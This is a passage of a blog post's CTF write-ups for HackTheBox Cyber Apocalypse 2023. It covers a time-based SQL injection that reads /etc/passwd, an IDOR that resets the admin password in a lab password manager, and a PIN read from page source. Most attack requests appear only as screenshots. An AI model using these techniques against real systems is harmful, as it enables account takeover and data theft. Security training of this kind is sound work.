		data-flex-grow="232"
		data-flex-basis="557px"
	
></p>
<p>Response</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325194718.png"
	width="841"
	height="706"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325194718_hu1859678639897015526.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325194718_hu12889675223937199596.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="119"
		data-flex-basis="285px"
	
></p>
<p>We see the contents of /etc/passwd. Now all that remains is to find the flag.
After making several guesses on where the flag might be located, we have yet to find the flag. Back to the source code, perhaps we can see how it is being placed upon initialization by viewing the Dockerfile:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">cat</span> <span class="n">Dockerfile</span>        
</span></span><span class="line"><span class="cl"><span class="n">FROM</span> <span class="n">python</span><span class="p">:</span><span class="mf">3.8</span><span class="o">-</span><span class="n">alpine</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Install packages</span>
</span></span><span class="line"><span class="cl"><span class="n">RUN</span> <span class="n">apk</span> <span class="n">add</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">cache</span> <span class="o">--</span><span class="n">update</span> <span class="n">mariadb</span> <span class="n">mariadb</span><span class="o">-</span><span class="n">client</span> <span class="n">supervisor</span> <span class="n">gcc</span> <span class="n">musl</span><span class="o">-</span><span class="n">dev</span> <span class="n">mariadb</span><span class="o">-</span><span class="n">connector</span><span class="o">-</span><span class="n">c</span><span class="o">-</span><span class="n">dev</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Upgrade pip</span>
</span></span><span class="line"><span class="cl"><span class="n">RUN</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">pip</span> <span class="n">install</span> <span class="o">--</span><span class="n">upgrade</span> <span class="n">pip</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Install dependencies</span>
</span></span><span class="line"><span class="cl"><span class="n">RUN</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">Flask</span> <span class="n">flask_mysqldb</span> <span class="n">pyjwt</span> <span class="n">colorama</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup app</span>
</span></span><span class="line"><span class="cl"><span class="n">RUN</span> <span class="n">mkdir</span> <span class="o">-</span><span class="n">p</span> <span class="o">/</span><span class="n">app</span>
</span></span><span class="line"><span class="cl"><span class="n">RUN</span> <span class="n">mkdir</span> <span class="o">-</span><span class="n">p</span> <span class="o">/</span><span class="n">communication</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Switch working environment</span>
</span></span><span class="line"><span class="cl"><span class="n">WORKDIR</span> <span class="o">/</span><span class="n">app</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Add application</span>
</span></span><span class="line"><span class="cl"><span class="n">COPY</span> <span class="n">challenge</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup supervisor</span>
</span></span><span class="line"><span class="cl"><span class="n">COPY</span> <span class="n">config</span><span class="o">/</span><span class="n">supervisord</span><span class="o">.</span><span class="n">conf</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">supervisord</span><span class="o">.</span><span class="n">conf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Expose port the server is reachable on</span>
</span></span><span class="line"><span class="cl"><span class="n">EXPOSE</span> <span class="mi">1337</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Disable pycache</span>
</span></span><span class="line"><span class="cl"><span class="n">ENV</span> <span class="n">PYTHONDONTWRITEBYTECODE</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># copy flag</span>
</span></span><span class="line"><span class="cl"><span class="n">COPY</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span> <span class="o">/</span><span class="n">signal_sleuth_firmware</span>
</span></span><span class="line"><span class="cl"><span class="n">COPY</span> <span class="n">files</span> <span class="o">/</span><span class="n">communications</span><span class="o">/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># create database and start supervisord</span>
</span></span><span class="line"><span class="cl"><span class="n">COPY</span> <span class="o">--</span><span class="n">chown</span><span class="o">=</span><span class="n">root</span> <span class="n">entrypoint</span><span class="o">.</span><span class="n">sh</span> <span class="o">/</span><span class="n">entrypoint</span><span class="o">.</span><span class="n">sh</span>
</span></span><span class="line"><span class="cl"><span class="n">RUN</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">/</span><span class="n">entrypoint</span><span class="o">.</span><span class="n">sh</span>
</span></span><span class="line"><span class="cl"><span class="n">ENTRYPOINT</span> <span class="p">[</span><span class="s2">&#34;/entrypoint.sh&#34;</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>They did indeed pull a cheeky one on us, note how the flag.txt has been renamed! In this machine it&rsquo;s now called <code>signal_sleuth_firmware</code>
In Burpsuite:
Request:</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325195247.png"
	width="834"
	height="355"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325195247_hu6634763150506209975.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325195247_hu9617935246470853385.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="234"
		data-flex-basis="563px"
	
></p>
<p>Response:</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325195302.png"
	width="837"
	height="284"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325195302_hu6263893361952964451.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325195302_hu11170959132894575363.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="294"
		data-flex-basis="707px"
	
></p>
<p>Flag <code>HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}</code></p>
<h3 id="passman">Passman
</h3><blockquote>
<p>Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?
<strong>Difficulty: easy</strong></p>
</blockquote>
<hr>
<p>Visiting the page we are greeted with a login page. We are also presented with the option to create an account. After guessing a few times for user admin, I decide to create a user. Trying username <code>admin</code> results in an error, telling us this username is in use. Good to note; for now we will create user <code>a</code>.
Registering as user a was successful, and now we see a page where we might submit and store passwords for given addresses. This page operates as a password manager, true to the challenge description and title. A brief check at XSS fails, so let&rsquo;s explore the provided source code.
Interestingly, the <code>database.js</code> file shows us more request options than we might have expected. In particular, there is an option to update passwords:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    async updatePassword(username, password) {
</span></span><span class="line"><span class="cl">        return new Promise(async (resolve, reject) =&gt; {
</span></span><span class="line"><span class="cl">            let stmt = `UPDATE users SET password = ? WHERE username = ?`;
</span></span><span class="line"><span class="cl">            this.connection.query(
</span></span><span class="line"><span class="cl">                stmt,
</span></span><span class="line"><span class="cl">                [
</span></span><span class="line"><span class="cl">                    String(password),
</span></span><span class="line"><span class="cl">                    String(username)
</span></span><span class="line"><span class="cl">                ],
</span></span><span class="line"><span class="cl">                (err, _) =&gt; {
</span></span><span class="line"><span class="cl">                    if(err)
</span></span><span class="line"><span class="cl">                        reject(err)
</span></span><span class="line"><span class="cl">                    resolve();
</span></span><span class="line"><span class="cl">                            }
</span></span><span class="line"><span class="cl">            )
</span></span><span class="line"><span class="cl">        });
</span></span><span class="line"><span class="cl">    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is no authorization verification here, so perhaps if we can request to change the password of user admin, we can login as admin.
Starting with a post request to register a new user:</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325201148.png"
	width="835"
	height="466"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325201148_hu13129624876053122228.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325201148_hu9238555264393111704.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="179"
		data-flex-basis="430px"
	
></p>
<p>Revised post request:</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325201127.png"
	width="834"
	height="449"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325201127_hu3768907259702419912.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325201127_hu176403587749570141.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="445px"
	
></p>
<p>Response:</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325201228.png"
	width="837"
	height="301"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325201228_hu15212653343367175008.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325201228_hu16978452723699094055.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="278"
		data-flex-basis="667px"
	
></p>
<p>We have updated the admin password successfully, or so it says. When we attempt to login as admin, we are successful! The flag is given in the password field of admin&rsquo;s saved passwords.</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325201439.png"
	width="1309"
	height="327"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325201439_hu11769877474158197108.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325201439_hu17206476831448209502.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="400"
		data-flex-basis="960px"
	
></p>
<p><code>HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}</code></p>
<h3 id="trapped-source">Trapped Source
</h3><blockquote>
<p>Intergalactic Ministry of Spies tested Pandora&rsquo;s movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door?
<strong>Difficutly: very easy</strong></p>
</blockquote>
<hr>
<p>Upon visiting the given address, we see a locked keypad:
<img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325101548.png"
	width="360"
	height="504"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325101548_hu1947690782325649619.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325101548_hu3647924228173675323.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="71"
		data-flex-basis="171px"
	
></p>
<p>There is not much going on with the page, so we can check the page source with CTRL+U.</p>
<p>In the source code, we see the correct pin:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
</span></span><span class="line"><span class="cl">	&lt;script&gt;
</span></span><span class="line"><span class="cl">		window.CONFIG = window.CONFIG || {
</span></span><span class="line"><span class="cl">			buildNumber: &#34;v20190816&#34;,
</span></span><span class="line"><span class="cl">			debug: false,
</span></span><span class="line"><span class="cl">			modelName: &#34;Valencia&#34;,
</span></span><span class="line"><span class="cl">			correctPin: &#34;8291&#34;,
</span></span><span class="line"><span class="cl">		}
</span></span><span class="line"><span class="cl">	&lt;/script&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Just like that, the flag is given:</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325101735.png"
	width="350"
	height="84"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325101735_hu654573127289366121.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325101735_hu13328440636376450096.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="416"
		data-flex-basis="1000px"
	
></p>
<p>However, we cannot highlight for easy copy paste. We will inspect the object. Right clicking over the flag, we can Inspect, and the flag is in text:</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325101856.png"
	width="630"
	height="70"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325101856_hu12338323154719848413.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325101856_hu15186468856133143649.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="900"
		data-flex-basis="2160px"
	
></p>
<p>From here we can right click and &ldquo;copy inner HTML&rdquo;. Now we have the flag to paste easy, and guaranteed free from spelling errors.</p>
<p><code>HTB{V13w_50urc3_c4n_b3_u53ful!!!}</code></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/forensics/">Forensics</a>
        
            <a href="/tags/misc/">Misc</a>
        
            <a href="/tags/web/">Web</a>
        
            <a href="/tags/pwn/">Pwn</a>
        
    </section>


    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/post/picoctf_2023/">
        
        

        <div class="article-details">
            <h2 class="article-title">PicoCTF_2023</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/post/huntress-ctf-2024/">
        
        
            <div class="article-image">
                <img src="/post/huntress-ctf-2024/HuntressCTF_Banner.6181f047aa18073aac2b72b3a0aa3ba2_hu2497031440356620825.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Huntress CTF 2024"
                        
                        data-hash="md5-YYHwR6oYBzqsK3KzoKo7og==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Huntress CTF 2024</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/post/hackthebox-cyber-apocalypse-2024/">
        
        
            <div class="article-image">
                <img src="/post/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background.d1ff26ab7326bd1a79b6d1e0a52f6aa6_hu13886050347455417942.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Cyber Apocalypse: 2024"
                        
                        data-hash="md5-0f8mq3MmvRp5ttHgpS9qpg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Cyber Apocalypse: 2024</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/post/hack-the-boo-2023/">
        
        

        <div class="article-details">
            <h2 class="article-title">Hack The Boo 2023</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/post/nahamconctf_2023/">
        
        

        <div class="article-details">
            <h2 class="article-title">NahamConCTF_2023</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2023 - 
        
        2024 Spencer&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
